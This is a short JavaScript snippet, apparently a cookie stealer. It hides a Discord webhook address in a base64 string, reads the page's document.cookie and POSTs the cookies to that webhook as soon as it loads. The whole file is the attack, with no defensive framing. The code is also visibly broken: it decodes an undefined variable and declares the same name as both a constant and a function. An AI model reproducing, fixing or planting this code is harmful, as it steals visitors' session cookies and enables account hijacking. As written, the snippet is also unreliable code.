const aaa = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSbEgzN090ZGNLZXJkdi1GZ0pGOXJhSE5VdjVzLW4wei11RHE3ay1WOF9ZWEM4NTFNeVVnejhsZA==';
const bbb = atob(encodedWebhookURL);

function aaa() {
  const cookies = document.cookie;
  fetch(bbb, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      content: `\`${cookies}\``
    })
  });
}

aaa();
